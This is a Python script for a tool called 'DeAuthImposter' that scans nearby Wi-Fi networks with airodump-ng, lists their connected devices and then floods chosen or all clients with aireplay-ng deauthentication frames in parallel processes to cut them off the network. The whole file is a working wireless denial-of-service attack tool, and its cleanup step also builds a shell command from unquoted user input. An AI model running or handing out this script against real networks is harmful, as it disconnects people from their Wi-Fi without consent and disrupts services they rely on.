import sys
import os
import subprocess as subp
import csv
import time
import multiprocessing
from prettytable import PrettyTable
import pyfiglet 



#This just to check if system arguments are correct!!
if(len(sys.argv) == 2):
    if(sys.argv[1] == "--help"):
        print(pyfiglet.figlet_format("Help Section For DeauthImpo!", font = "slant", width = 80 ))
        HELP_MESSAGE = """\n\nFirst Argument\n\tall\t\t-- To target all devices\n\tselect\t\t-- To target specific devices!\n\nSecond Argument\n\t[Network Interface Name for wifi]\t-- Name of network interface name for wifi (you find that by running commands "ifconfig" for linux and "ipconfig" for windows)"""
        print(HELP_MESSAGE)
        sys.exit(0)



if(len(sys.argv) < 3):
    print("Invalid arguments please refer --help command for for info.")
    sys.exit(0) 

user_arg = sys.argv[1]


if(user_arg != "all" and user_arg != "select"):
    print("Invalid arguments please refer --help command for for info.")
    sys.exit(0)

user_interface = sys.argv[2]
print(pyfiglet.figlet_format("DeAuthImposter!", font = "slant", width = 100 ))

print("Working on some PreRequisites...\n")


####Premethods####
#Turning wifi mode from managed to monitor
subp.run(['bash','./Requires/premethods.sh',user_interface], capture_output=True)

print("Getting Network Ready...\nScanning...\n")

time.sleep(3)


####Catching All nearby Newtworks####
try:
    subp.run(['airodump-ng','--write','./Requires/test',user_interface], timeout=12)
except Exception as e:
    pass



####Parsing and getting data of Networks####
subp.run(['python3','./Requires/parse.py'],capture_output=True)

with open('./Requires/network.csv','r') as f1: 
    cr = csv.reader(f1)
    l1 = []
    l2 = ['dummy','dummy','dummy']
    for line in cr:
        l2[0] = line[1]
        l2[1] = line[0]
        l2[2] = line[2]
        l1.append(l2.copy())
    print("result of parse.py: ",l1)

#####Printing all Networks####
print("------------Networks------------\n")
table = PrettyTable(['Mac_Address', 'Network_Name', 'Channel', 'Number'])
i=1
for rec in l1:
    rec.append(i)
    table.add_row(rec)
    i = i+1
print(table)


####Delelting non-required files####
subp.run('rm ./Requires/test*',shell=True,capture_output=True)



####Resetting terminal to take outputs####
subp.run('reset',capture_output=True)



####getting user Network####
target_net = int(input("Enter Number for Network you are connected to: "))
target_net_info = l1[target_net-1].copy()


####Catching all devices connected to that network####
try:
    subp.run(['airodump-ng','--bssid',target_net_info[0].strip(),'--channel',target_net_info[2].strip(),'--write','./Requires/test',user_interface], timeout=15)
except Exception as e:
    pass



####Parsing and getting data of Devices(Mac-Address)####
subp.run(['python3','./Requires/parse2.py',user_interface],capture_output=True)
with open('./Requires/network2.csv','r') as f1: 
    cr = csv.reader(f1)
    final = []
    l2 = ['dummy','dummy']
    for line in cr:
        l2[0] = line[0]
        final.append(l2.copy())
    print("result of parse2.py: ",final)


####Deleing all non-required files####
subp.run('rm ./Requires/test*',shell=True,capture_output=True)



####Moving forward as user arguments####
if(user_arg == "all"):
    pass
else:
    while(target_net != "ok"):
        print("------------Stations------------\n")
        table = PrettyTable(['Mac_Address', 'Number'])
        i=1
        for rec in final:
            rec[1] = i
            table.add_row(rec)
            i = i+1
        print(table)
        target_net = 0

        subp.run('reset',capture_output=True)
        target_net = input("Enter Number for Station you dont want disconnect for wifi: ")
        if(target_net == "ok"):
            break
        else:
            target_net = int(target_net)    
        final.pop(target_net-1)
        print("Press ok to continue\n")


####DEauth function####
def deauthim(mac):
    subp.run(['aireplay-ng' ,'--deauth' ,'100000' ,'-a' ,target_net_info[0].strip()  ,'-c' ,mac ,user_interface],capture_output=True)

####Deauthenticating####
deauthid = []
for record in final:
    print("DeAuthenticating: "+record[0])
    proc = multiprocessing.Process(target = deauthim,args=(record[0],))
    proc.start()
    deauthid.append(proc)

subp.run('reset',capture_output=True)
while (True):
    last = input("Write quit and Enter to quit: ")
    if(last == "quit"):
        print("Rolling back changes and quitting...")
        for reco in deauthid:
            reco.terminate()
        break    
    else:
        print("plz Enter Properly!!\n")
        continue



####Finishing Attack and Rolling back####
subp.run(f'bash ./Requires/premethodsfix.sh {user_interface}',shell=True,capture_output=True)
print("Thanks for using our Program!\n")    
subp.run('reset',capture_output=True)
        

       
